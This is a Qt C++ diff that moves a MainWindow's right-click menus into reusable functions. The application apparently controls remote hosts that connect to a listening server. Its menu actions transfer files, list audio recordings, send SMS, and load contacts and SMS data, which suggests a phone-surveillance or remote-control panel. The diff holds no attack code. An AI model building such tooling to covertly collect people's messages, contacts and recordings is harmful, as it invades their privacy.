@@ -39,47 +39,17 @@ void MainWindow::init()
     QObject::connect(&mModel,SIGNAL(onHostOnline(QHostAddress,quint16)),this,SLOT(onHostOnline(QHostAddress,quint16)));
 }
 
-void MainWindow::initLeftClick()
-{
-    QAction* aDownloadFile;
-    mLeftMenu.addAction(aDownloadFile = new QAction(QStringLiteral("文件传输"), &mLeftMenu));
-    QObject::connect(aDownloadFile, SIGNAL(triggered()), this, SLOT(listFile()));
-
-    QAction* aAudioRecordList;
-    mLeftMenu.addAction(aAudioRecordList = new QAction(QStringLiteral("录音列表"), &mLeftMenu));
-    QObject::connect(aAudioRecordList, SIGNAL(triggered()), this, SLOT(listAudioRecord()));
-}
-
 void MainWindow::initView()
 {
     QObject::connect(&mSessionManager, SIGNAL(onIncomeHost(QString,QHostAddress,quint16)), &mModel, SLOT(putItem(QString,QHostAddress,quint16)));
     QObject::connect(&mModel,SIGNAL(modelReset()),this,SLOT(updateView()));
     ui->tableView->setModel(&mModel);
-    ui->tableView->setContextMenuPolicy(Qt::ActionsContextMenu);
+    ui->tableView->setContextMenuPolicy(Qt::CustomContextMenu);
     ui->tableView->resizeColumnToContents(0);
 
-    QAction *aAll,*aNone,*aReverse;
-    ui->tableView->addAction(aAll = new QAction(QStringLiteral("全选"),ui->tableView));
-    ui->tableView->addAction(aNone = new QAction(QStringLiteral("全不选"),ui->tableView));
-    ui->tableView->addAction(aReverse = new QAction(QStringLiteral("反选"),ui->tableView));
-
-    QObject::connect(aAll,SIGNAL(triggered()),&mModel,SLOT(selectAll()));
-    QObject::connect(aNone,SIGNAL(triggered()),&mModel,SLOT(unselectAll()));
-    QObject::connect(aReverse,SIGNAL(triggered()),&mModel,SLOT(reverseSelect()));
-
-    QAction *separator = new QAction(QString(),ui->tableView);
-    separator->setSeparator(true);
-    ui->tableView->addAction(separator);
-
-
-    QAction *aSendSms,*aLoadContact,*aLoadSms;
-    ui->tableView->addAction(aSendSms = new QAction(QStringLiteral("发送短信"),ui->tableView));
-    ui->tableView->addAction(aLoadContact = new QAction(QStringLiteral("载入联系人数据"),ui->tableView));
-    ui->tableView->addAction(aLoadSms = new QAction(QStringLiteral("载入短信数据"),ui->tableView));
-
-    QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
-    QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadSms()));
-    QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadContact()));
+    this->initMenu(&this->mRightMenu);
+    this->initMenuWithItem(&this->mRightMenuWithItem);
+    this->initMenu(&this->mRightMenuWithItem);
 
     ui->actionStartServer->setText(QStringLiteral("开始监听"));
     QObject::connect(ui->actionStartServer, SIGNAL(triggered()), this, SLOT(handleServerStart()));
@@ -89,8 +59,6 @@ void MainWindow::initView()
     for(int i = 1; i<mModel.columnCount(); ++i) {
         ui->tableView->setColumnWidth(i, 150);
     }
-
-    initLeftClick();
 
     outputLogWarning(QStringLiteral("====================   程序开始运行  ===================="));
 }
@@ -324,9 +292,66 @@ void MainWindow::onStartSessionFailed(const QString& sessionName, const QString&
 
 void MainWindow::on_tableView_doubleClicked(const QModelIndex &index)
 {
+//    vector<pair<QHostAddress, quint16> > list = mModel.getHostAddr();
+//    if(index.row()>= list.size()) return;
+//    mCurrentHostAddress = list.at(index.row()).first;
+//    mCurrentPort = list.at(index.row()).second;
+//    mLeftMenu.popup(cursor().pos());
+}
+
+void MainWindow::on_tableView_customContextMenuRequested(const QPoint &pos)
+{
     vector<pair<QHostAddress, quint16> > list = mModel.getHostAddr();
-    if(index.row()>= list.size()) return;
-    mCurrentHostAddress = list.at(index.row()).first;
-    mCurrentPort = list.at(index.row()).second;
-    mLeftMenu.popup(cursor().pos());
+    QModelIndex index = ui->tableView->indexAt(pos);
+    if(0<=index.row() && index.row() <list.size())
+    {
+        mRightMenuWithItem.exec(QCursor::pos());
+        mCurrentHostAddress = list.at(index.row()).first;
+        mCurrentPort = list.at(index.row()).second;
+    }
+    else
+    {
+        mRightMenu.exec(QCursor::pos());
+    }
+}
+
+void MainWindow::initMenuWithItem(QWidget* widget)
+{
+    QAction* aDownloadFile;
+    widget->addAction(aDownloadFile = new QAction(QStringLiteral("文件传输"), widget));
+    QObject::connect(aDownloadFile, SIGNAL(triggered()), this, SLOT(listFile()));
+
+    QAction* aAudioRecordList;
+    widget->addAction(aAudioRecordList = new QAction(QStringLiteral("录音列表"),widget));
+    QObject::connect(aAudioRecordList, SIGNAL(triggered()), this, SLOT(listAudioRecord()));
+
+    QAction *separator = new QAction(QString(),widget);
+    separator->setSeparator(true);
+    widget->addAction(separator);
+}
+
+void MainWindow::initMenu(QWidget* widget)
+{
+    QAction *aAll,*aNone,*aReverse;
+    widget->addAction(aAll = new QAction(QStringLiteral("全选"),widget));
+    widget->addAction(aNone = new QAction(QStringLiteral("全不选"),widget));
+    widget->addAction(aReverse = new QAction(QStringLiteral("反选"),widget));
+
+    QObject::connect(aAll,SIGNAL(triggered()),&mModel,SLOT(selectAll()));
+    QObject::connect(aNone,SIGNAL(triggered()),&mModel,SLOT(unselectAll()));
+    QObject::connect(aReverse,SIGNAL(triggered()),&mModel,SLOT(reverseSelect()));
+
+    QAction *separator = new QAction(QString(),widget);
+    separator->setSeparator(true);
+    widget->addAction(separator);
+
+
+    QAction *aSendSms,*aLoadContact,*aLoadSms;
+    widget->addAction(aSendSms = new QAction(QStringLiteral("发送短信"),widget));
+    widget->addAction(aLoadContact = new QAction(QStringLiteral("载入联系人数据"),widget));
+    widget->addAction(aLoadSms = new QAction(QStringLiteral("载入短信数据"),widget));
+
+    QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
+    QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadSms()));
+    QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadContact()));
 }
